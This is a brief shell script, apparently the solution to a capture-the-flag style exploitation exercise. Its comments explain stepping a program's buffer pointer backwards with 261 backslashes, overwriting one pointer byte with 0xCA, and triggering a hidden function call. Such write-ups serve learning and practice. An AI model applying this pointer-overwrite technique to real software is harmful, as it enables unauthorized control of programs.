# We can step ptr backwards by sending a "\" character to stdin.
# First it points to the middle of the buffe: buf + 256.
# The pointer itself is at buf - 8 (8 byte, little-endian pointers on my machine).
# We must make the 4th byte of the pinter equal to 0xCA.
# So we must send 256 + 5 backslashes and then the value 0xCA followed by any
# character to trigger the branch of the case statement that calls e();

# backslashes
printf '\%.0s' {1..261}

# 0xCA
echo -e -n '\xCAa'

# to trigger e() - could be any character
echo "a"
